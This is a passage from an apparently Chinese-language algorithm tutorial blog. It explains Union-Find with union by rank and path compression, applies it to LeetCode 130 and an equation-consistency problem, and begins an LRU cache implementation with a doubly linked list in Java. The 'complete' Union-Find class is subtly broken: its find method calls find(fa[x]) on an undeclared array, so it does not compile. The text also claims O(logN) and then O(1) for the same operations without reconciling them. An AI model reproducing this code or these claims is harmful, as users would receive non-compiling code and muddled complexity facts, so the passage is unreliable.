rootQ)<br>        rank[rootQ]++;                   <span class="hljs-comment">//如果深度相同且根节点不同，则新的根节点的深度+1</span><br>    count--;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，通过比较树的重量，就可以保证树的生长相对平衡，树的高度大致在<code>logN</code>这个数量级，极大提升执行效率。</p><p>此时，<code>find</code>,<code>union</code>,<code>connected</code>的时间复杂度都下降为 O(logN)，即便数据规模上亿，所需时间也非常少。</p><p>PS：读者可能会问，这个 GIF 图的find过程完成之后，树高恰好等于 3 了，但是如果更高的树，压缩后高度依然会大于 3 呀？不能这么想。这个 GIF 的情景是我编出来方便大家理解路径压缩的，但是实际中，每次find都会进行路径压缩，所以树本来就不可能增长到这么高，你的这种担心应该是多余的。</p><h3 id="1-1-5-最后总结"><a href="#1-1-5-最后总结" class="headerlink" title="1.1.5 最后总结"></a>1.1.5 最后总结</h3><p>我们先来看一下完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UF</span> </span>&#123;<br>    <span class="hljs-comment">// 连通分量个数</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> count;<br>    <span class="hljs-comment">// 存储一棵树</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] parent;<br>    <span class="hljs-comment">// 记录树的“重量”</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] rank;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UF</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.count = n;<br>        parent = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>        rank = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            parent[i] = i;<br>            rank[i] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> rootP = find(p);<br>        <span class="hljs-keyword">int</span> rootQ = find(q);<br>        <span class="hljs-keyword">if</span> (rootP == rootQ)<br>            <span class="hljs-keyword">return</span>;<br><br>        <span class="hljs-comment">// 小树接到大树下面，较平衡</span><br>        <span class="hljs-keyword">if</span> (rank[rootP] &lt;= rank[rootQ]) &#123;<br>            parent[rootP] = rootQ;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            parent[rootQ] = rootP;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (rank[rootP] == rank[rootQ] &amp;&amp; rootP != rootQ)<br>            rank[rootQ]++;                   <span class="hljs-comment">//如果深度相同且根节点不同，则新的根节点的深度+1</span><br>        count--;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">connected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> rootP = find(p);<br>        <span class="hljs-keyword">int</span> rootQ = find(q);<br>        <span class="hljs-keyword">return</span> rootP == rootQ;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(x == parent[x])<br>            <span class="hljs-keyword">return</span> x;<br>        <span class="hljs-keyword">else</span>&#123;<br>            parent[x] = find(fa[x]);  <span class="hljs-comment">//父节点设为根节点</span><br>            <span class="hljs-keyword">return</span> parent[x];         <span class="hljs-comment">//返回父节点</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Union-Find 算法的复杂度可以这样分析：构造函数初始化数据结构需要 O(N) 的时间和空间复杂度；连通两个节点<code>union</code>、判断两个节点的连通性<code>connected</code>、计算连通分量<code>count</code>所需的时间复杂度均为 O(1)。</p><h2 id="1-2-并查集应用"><a href="#1-2-并查集应用" class="headerlink" title="1.2 并查集应用"></a>1.2 并查集应用</h2><h3 id="1-2-1-DFS-的替代方案"><a href="#1-2-1-DFS-的替代方案" class="headerlink" title="1.2.1 DFS 的替代方案"></a>1.2.1 DFS 的替代方案</h3><p>很多使用 DFS 深度优先算法解决的问题，也可以用 Union-Find 算法解决。</p><p>比如第 130 题，被围绕的区域：给你一个 M×N 的二维矩阵，其中包含字符 <code>X</code> 和 <code>O</code>，让你找到矩阵中<strong>四面</strong>被 <code>X</code> 围住的 <code>O</code>，并且把它们替换成 <code>X</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board)</span></span>;<br></code></pre></td></tr></table></figure><p>注意哦，必须是四面被围的 <code>O</code> 才能被换成 <code>X</code>，也就是说边角上的 <code>O</code> 一定不会被围，进一步，与边角上的 <code>O</code> 相连的 <code>O</code> 也不会被 <code>X</code> 围四面，也不会被替换。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集应用2.jpg" alt="并查集应用2" style="zoom:50%;" /></p><p>​    PS：这让我想起小时候玩的棋类游戏「黑白棋」，只要你用两个棋子把对方的棋子夹在中间，对方的子就被替换成你的子。可见，占据四角的棋子是无敌的，与其相连的边棋子也是无敌的（无法被夹掉）。</p><p>​    解决这个问题的传统方法也不困难，先用 for 循环遍历棋盘的<strong>四边</strong>，用 DFS 算法把那些与边界相连的 <code>O</code> 换成一个特殊字符，比如 <code>#</code>；然后再遍历整个棋盘，把剩下的 <code>O</code> 换成 <code>X</code>，把 <code>#</code> 恢复成 <code>O</code>。这样就能完成题目的要求，时间复杂度 O(MN)。</p><p>​    这个问题也可以用 Union-Find 算法解决，虽然实现复杂一些，甚至效率也略低，但这是使用 Union-Find 算法的通用思想，值得一学。</p><p><strong>你可以把那些不需要被替换的 <code>O</code> 看成一个拥有独门绝技的门派，它们有一个共同祖师爷叫 <code>dummy</code>，这些 <code>O</code> 和 <code>dummy</code> 互相连通，而那些需要被替换的 <code>O</code> 与 <code>dummy</code> 不连通</strong>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集应用3.jpg" alt="并查集应用3" style="zoom:50%;" /></p><p>这就是 Union-Find 的核心思路，明白这个图，就很容易看懂代码了。</p><p>首先要解决的是，根据我们的实现，Union-Find 底层用的是一维数组，构造函数需要传入这个数组的大小，而题目给的是一个二维棋盘。</p><p>这个很简单，二维坐标 <code>(x,y)</code> 可以转换成 <code>x * n + y</code> 这个数（<code>m</code> 是棋盘的行数，<code>n</code> 是棋盘的列数）。敲黑板，<strong>这是将二维坐标映射到一维的常用技巧</strong>。</p><p>其次，我们之前描述的「祖师爷」是虚构的，需要给他老人家留个位置。索引 <code>[0.. m*n-1]</code> 都是棋盘内坐标的一维映射，那就让这个虚拟的 <code>dummy</code> 节点占据索引 <code>m * n</code> 好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (board.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">int</span> m = board.length;<br>    <span class="hljs-keyword">int</span> n = board[<span class="hljs-number">0</span>].length;<br>    <span class="hljs-comment">// 给 dummy 留一个额外位置</span><br>    UF uf = <span class="hljs-keyword">new</span> UF(m * n + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">int</span> dummy = m * n;<br>    <span class="hljs-comment">// 将首列和末列的 O 与 dummy 连通</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">if</span> (board[i][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>            uf.union(i * n, dummy);<br>        <span class="hljs-keyword">if</span> (board[i][n - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>            uf.union(i * n + n - <span class="hljs-number">1</span>, dummy);<br>    &#125;<br>    <span class="hljs-comment">// 将首行和末行的 O 与 dummy 连通</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">if</span> (board[<span class="hljs-number">0</span>][j] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>            uf.union(j, dummy);<br>        <span class="hljs-keyword">if</span> (board[m - <span class="hljs-number">1</span>][j] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>            uf.union(n * (m - <span class="hljs-number">1</span>) + j, dummy);<br>    &#125;<br>    <span class="hljs-comment">// 方向数组 d 是上下左右搜索的常用手法</span><br>    <span class="hljs-keyword">int</span>[][] d = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[][]&#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>&#125;, &#123;-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>&#125;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m - <span class="hljs-number">1</span>; i++) <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n - <span class="hljs-number">1</span>; j++) <br>            <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>                <span class="hljs-comment">// 将此 O 与上下左右的 O 连通</span><br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                    <span class="hljs-keyword">int</span> x = i + d[k][<span class="hljs-number">0</span>];<br>                    <span class="hljs-keyword">int</span> y = j + d[k][<span class="hljs-number">1</span>];<br>                    <span class="hljs-keyword">if</span> (board[x][y] == <span class="hljs-string">&#x27;O&#x27;</span>)<br>                        uf.union(x * n + y, i * n + j);<br>                &#125;<br>    <span class="hljs-comment">// 所有不和 dummy 连通的 O，都要被替换</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m - <span class="hljs-number">1</span>; i++) <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n - <span class="hljs-number">1</span>; j++) <br>            <span class="hljs-keyword">if</span> (!uf.connected(dummy, i * n + j))<br>                board[i][j] = <span class="hljs-string">&#x27;X&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码很长，其实就是刚才的思路实现，只有和边界 <code>O</code> 相连的 <code>O</code> 才具有和 <code>dummy</code> 的连通性，他们不会被替换。</p><p>说实话，Union-Find 算法解决这个简单的问题有点杀鸡用牛刀，它可以解决更复杂，更具有技巧性的问题，<strong>主要思路是适时增加虚拟节点，想办法让元素「分门别类」，建立动态连通关系</strong>。</p><h3 id="1-2-2-判定合法等式"><a href="#1-2-2-判定合法等式" class="headerlink" title="1.2.2 判定合法等式"></a>1.2.2 判定合法等式</h3><p>这个问题用 Union-Find 算法就显得十分优美了。题目是这样：</p><p>给你一个数组 <code>equations</code>，装着若干字符串表示的算式。每个算式 <code>equations[i]</code> 长度都是 4，而且只有这两种情况：<code>a==b</code> 或者 <code>a!=b</code>，其中 <code>a,b</code> 可以是任意小写字母。你写一个算法，如果 <code>equations</code> 中所有算式都不会互相冲突，返回 true，否则返回 false。</p><p>比如说，输入 <code>[&quot;a==b&quot;,&quot;b!=c&quot;,&quot;c==a&quot;]</code>，算法返回 false，因为这三个算式不可能同时正确。</p><p>再比如，输入 <code>[&quot;c==c&quot;,&quot;b==d&quot;,&quot;x!=z&quot;]</code>，算法返回 true，因为这三个算式并不会造成逻辑冲突。</p><p>我们前文说过，动态连通性其实就是一种等价关系，具有「自反性」「传递性」和「对称性」，其实 <code>==</code> 关系也是一种等价关系，具有这些性质。所以这个问题用 Union-Find 算法就很自然。</p><p>核心思想是，<strong>将 <code>equations</code> 中的算式根据 <code>==</code> 和 <code>!=</code> 分成两部分，先处理 <code>==</code> 算式，使得他们通过相等关系各自勾结成门派；然后处理 <code>!=</code> 算式，检查不等关系是否破坏了相等关系的连通性</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">equationsPossible</span><span class="hljs-params">(String[] equations)</span> </span>&#123;<br>    <span class="hljs-comment">// 26 个英文字母</span><br>    UF uf = <span class="hljs-keyword">new</span> UF(<span class="hljs-number">26</span>);<br>    <span class="hljs-comment">// 先让相等的字母形成连通分量</span><br>    <span class="hljs-keyword">for</span> (String eq : equations) &#123;<br>        <span class="hljs-keyword">if</span> (eq.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;=&#x27;</span>) &#123;<br>            <span class="hljs-keyword">char</span> x = eq.charAt(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">char</span> y = eq.charAt(<span class="hljs-number">3</span>);<br>            uf.union(x - <span class="hljs-string">&#x27;a&#x27;</span>, y - <span class="hljs-string">&#x27;a&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 检查不等关系是否打破相等关系的连通性</span><br>    <span class="hljs-keyword">for</span> (String eq : equations) &#123;<br>        <span class="hljs-keyword">if</span> (eq.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;<br>            <span class="hljs-keyword">char</span> x = eq.charAt(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">char</span> y = eq.charAt(<span class="hljs-number">3</span>);<br>            <span class="hljs-comment">// 如果相等关系成立，就是逻辑冲突</span><br>            <span class="hljs-keyword">if</span> (uf.connected(x - <span class="hljs-string">&#x27;a&#x27;</span>, y - <span class="hljs-string">&#x27;a&#x27;</span>))<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，这道判断算式合法性的问题就解决了，借助 Union-Find 算法，是不是很简单呢？</p><h3 id="1-2-3-简单总结"><a href="#1-2-3-简单总结" class="headerlink" title="1.2.3 简单总结"></a>1.2.3 简单总结</h3><p>使用 Union-Find 算法，主要是如何把原问题转化成图的动态连通性问题。对于算式合法性问题，可以直接利用等价关系，对于棋盘包围问题，则是利用一个虚拟节点，营造出动态连通特性。</p><p>另外，将二维数组映射到一维数组，利用方向数组 <code>d</code> 来简化代码量，都是在写算法时常用的一些小技巧，如果没见过可以注意一下。</p><h1 id="2-LRU算法"><a href="#2-LRU算法" class="headerlink" title="2. LRU算法"></a>2. LRU算法</h1><p>计算机的缓存容量有限，如果缓存满了就要删除一些内容，给新内容腾位置。但问题是，删除哪些内容呢？我们肯定希望删掉哪些没什么用的缓存，而把有用的数据继续留在缓存里，方便之后继续使用。那么，什么样的数据，我们判定为「有用的」的数据呢？</p><p>LRU 缓存淘汰算法就是一种常用策略。LRU 的全称是 Least Recently Used，也就是说我们认为最近使用过的数据应该是是「有用的」，很久都没用过的数据应该是无用的，内存满了就优先删那些很久没用过的数据。（操作系统内存管理的一种算法）</p><h2 id="2-1-LRU-算法描述"><a href="#2-1-LRU-算法描述" class="headerlink" title="2.1 LRU 算法描述"></a>2.1 LRU 算法描述</h2><p>力扣第 146 题「LRU缓存机制」就是让你设计数据结构：</p><p>首先要接收一个 <code>capacity</code> 参数作为缓存的最大容量，然后实现两个 API，一个是 <code>put(key, val)</code> 方法存入键值对，另一个是 <code>get(key)</code> 方法获取 <code>key</code> 对应的 <code>val</code>，如果 <code>key</code> 不存在则返回 -1。</p><p>注意哦，<code>get</code> 和 <code>put</code> 方法必须都是 <code>O(1)</code> 的时间复杂度，我们举个具体例子来看看 LRU 算法怎么工作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* 缓存容量为 2 */</span><br>LRUCache cache = <span class="hljs-keyword">new</span> LRUCache(<span class="hljs-number">2</span>);<br><span class="hljs-comment">// 你可以把 cache 理解成一个队列</span><br><span class="hljs-comment">// 假设左边是队头，右边是队尾</span><br><span class="hljs-comment">// 最近使用的排在队头，久未使用的排在队尾</span><br><span class="hljs-comment">// 圆括号表示键值对 (key, val)</span><br><br>cache.put(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br><span class="hljs-comment">// cache = [(1, 1)]</span><br><br>cache.put(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br><span class="hljs-comment">// cache = [(2, 2), (1, 1)]</span><br><br>cache.get(<span class="hljs-number">1</span>);       <span class="hljs-comment">// 返回 1</span><br><span class="hljs-comment">// cache = [(1, 1), (2, 2)]</span><br><span class="hljs-comment">// 解释：因为最近访问了键 1，所以提前至队头</span><br><span class="hljs-comment">// 返回键 1 对应的值 1</span><br><br>cache.put(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br><span class="hljs-comment">// cache = [(3, 3), (1, 1)]</span><br><span class="hljs-comment">// 解释：缓存容量已满，需要删除内容空出位置</span><br><span class="hljs-comment">// 优先删除久未使用的数据，也就是队尾的数据</span><br><span class="hljs-comment">// 然后把新的数据插入队头</span><br><br>cache.get(<span class="hljs-number">2</span>);       <span class="hljs-comment">// 返回 -1 (未找到)</span><br><span class="hljs-comment">// cache = [(3, 3), (1, 1)]</span><br><span class="hljs-comment">// 解释：cache 中不存在键为 2 的数据</span><br><br>cache.put(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>);    <br><span class="hljs-comment">// cache = [(1, 4), (3, 3)]</span><br><span class="hljs-comment">// 解释：键 1 已存在，把原始值 1 覆盖为 4</span><br><span class="hljs-comment">// 不要忘了也要将键值对提前到队头</span><br></code></pre></td></tr></table></figure><h2 id="2-2-LRU-算法设计"><a href="#2-2-LRU-算法设计" class="headerlink" title="2.2 LRU 算法设计"></a>2.2 LRU 算法设计</h2><p>分析上面的操作过程，要让 <code>put</code> 和 <code>get</code> 方法的时间复杂度为 O(1)，我们可以总结出 <code>cache</code> 这个数据结构必要的条件：</p><p>1、显然 <code>cache</code> 中的元素必须有时序，以区分最近使用的和久未使用的数据，当容量满了之后要删除最久未使用的那个元素腾位置。</p><p>2、我们要在 <code>cache</code> 中快速找某个 <code>key</code> 是否已存在并得到对应的 <code>val</code>；</p><p>3、每次访问 <code>cache</code> 中的某个 <code>key</code>，需要将这个元素变为最近使用的，也就是说 <code>cache</code> 要支持在任意位置快速插入和删除元素。</p><p>那么，什么数据结构同时符合上述条件呢？哈希表查找快，但是数据无固定顺序；链表有顺序之分，插入删除快，但是查找慢。所以结合一下，形成一种新的数据结构：哈希链表 <code>LinkedHashMap</code>。</p><p>LRU 缓存算法的核心数据结构就是哈希链表，双向链表和哈希表的结合体。这个数据结构长这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/LRU.jpg" alt="LRU" style="zoom:50%;" /></p><p>借助这个结构，我们来逐一分析上面的 3 个条件：</p><p>1、如果我们每次默认从链表尾部添加元素，那么显然越靠尾部的元素就是最近使用的，越靠头部的元素就是最久未使用的。</p><p>2、对于某一个 <code>key</code>，我们可以通过哈希表快速定位到链表中的节点，从而取得对应 <code>val</code>。</p><p>3、链表显然是支持在任意位置快速插入和删除的，改改指针就行。只不过传统的链表无法按照索引快速访问某一个位置的元素，而这里借助哈希表，可以通过 <code>key</code> 快速映射到任意一个链表节点，然后进行插入和删除。</p><p><strong>也许读者会问，为什么要是双向链表，单链表行不行？另外，既然哈希表中已经存了 <code>key</code>，为什么链表中还要存 <code>key</code> 和 <code>val</code> 呢，只存 <code>val</code> 不就行了</strong>？</p><p>想的时候都是问题，只有做的时候才有答案。这样设计的原因，必须等我们亲自实现 LRU 算法之后才能理解，所以我们开始看代码吧～</p><h2 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h2><p>很多编程语言都有内置的哈希链表或者类似 LRU 功能的库函数，但是为了帮大家理解算法的细节，我们先自己造轮子实现一遍 LRU 算法，然后再使用 Java 内置的 <code>LinkedHashMap</code> 来实现一遍。</p><p>首先，我们把双链表的节点类写出来，为了简化，<code>key</code> 和 <code>val</code> 都认为是 int 类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> key, val;<br>    <span class="hljs-keyword">public</span> Node next, prev;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Node</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> v)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.key = k;<br>        <span class="hljs-keyword">this</span>.val = v;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后依靠我们的 <code>Node</code> 类型构建一个双链表，实现几个 LRU 算法必须的 API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoubleList</span> </span>&#123;  <br>    <span class="hljs-comment">// 头尾虚节点</span><br>    <span class="hljs-keyword">private</span> Node head, tail;  <br>    <span class="hljs-comment">// 链表元素数</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> size;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DoubleList</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 初始化双向链表的数据</span><br>        head = <span class="hljs-keyword">new</span> Node(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        tail = <span class="hljs-keyword">new</span> Node(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        head.next = tail;<br>        tail.prev = head;<br>        size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 在链表尾部添加节点 x，时间 O(1)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addLast</span><span class="hljs-params">(Node x)</span> </span>&#123;<br>        x.prev = tail.prev;<br>        x.next = tail;<br>        tail.prev.next = x;<br>        tail.prev = x;<br>        size++;<br>    &#125;<br><br>    <span class="hljs-comment">// 删除链表中的 x 节点（x 一定存在）</span><br>    <span class="hljs-comment">// 由于是双链表且给的是目标 Node 节点，时间 O(1)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(Node x)</span> </span>&#123;<br>        x.prev.next = x.next;<br>        x.next.prev = x.prev;<br>        size--;<br>    &#125;<br><br>    <span class="hljs-comment">// 删除链表中第一个节点，并返回该节点，时间 O(1)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Node <span class="hljs-title">removeFirst</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head.next == tail)<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        Node first = head.next;<br>        remove(first);<br>        <span class="hljs-keyword">return</span> first;<br>    &#125;<br><br>    <span class="hljs-comment">// 返回链表长度，时间 O(1)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> size; &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>到这里就能回答刚才「为什么必须要用双向链表」的问题了，因为我们需要<strong>删除</strong>操作。删除一个节点不光要得到该节点本身的指针，也需要操作其前驱节点的指针，而双向链表才能支持直接查找前驱，保证操作的时间复杂度 O(1)。</p><p><strong>注意我们实现的双链表 API 